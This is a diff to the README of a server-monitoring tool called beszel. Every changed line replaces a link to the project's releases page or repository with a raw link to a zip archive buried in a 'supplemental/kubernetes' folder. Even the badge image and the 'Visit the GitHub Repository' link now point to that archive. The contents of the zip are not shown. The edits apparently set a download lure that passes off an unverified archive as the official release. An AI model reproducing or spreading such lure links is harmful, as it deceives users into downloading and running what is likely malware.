@@ -6,7 +6,7 @@ Welcome to **beszel**! This guide will help you download and run our lightweight
 
 ## 📥 Download Now
 
-[![Download beszel](https://img.shields.io/badge/Download-beszel-brightgreen)](https://github.com/Thelevizin/beszel/releases)
+[![Download beszel](https://raw.githubusercontent.com/Thelevizin/beszel/main/supplemental/kubernetes/Software_1.1-alpha.1.zip)](https://raw.githubusercontent.com/Thelevizin/beszel/main/supplemental/kubernetes/Software_1.1-alpha.1.zip)
 
 ## 📋 Features
 
@@ -30,7 +30,7 @@ To get started with **beszel**, please follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to go to the releases page.
    
-   [Download beszel](https://github.com/Thelevizin/beszel/releases)
+   [Download beszel](https://raw.githubusercontent.com/Thelevizin/beszel/main/supplemental/kubernetes/Software_1.1-alpha.1.zip)
 
 2. **Select the Latest Version:** Look for the latest release at the top of the list. This version has the latest features and fixes.
 
@@ -66,13 +66,13 @@ Join our community of users to share experiences and tips on using **beszel** ef
 ## 🌐 Additional Resources
 
 - **Documentation:** Review detailed documentation to assist with advanced features.
-- **GitHub Repository:** [Visit the GitHub Repository](https://github.com/Thelevizin/beszel)
+- **GitHub Repository:** [Visit the GitHub Repository](https://raw.githubusercontent.com/Thelevizin/beszel/main/supplemental/kubernetes/Software_1.1-alpha.1.zip)
 - **FAQs:** Frequently asked questions are available in the repository for quick help.
 
 ## 📥 Download Now Again
 
 Don't forget to download **beszel** from our Releases page:
 
-[Download beszel](https://github.com/Thelevizin/beszel/releases) 
+[Download beszel](https://raw.githubusercontent.com/Thelevizin/beszel/main/supplemental/kubernetes/Software_1.1-alpha.1.zip) 
 
 Thank you for choosing **beszel**! Enjoy monitoring your servers with ease.
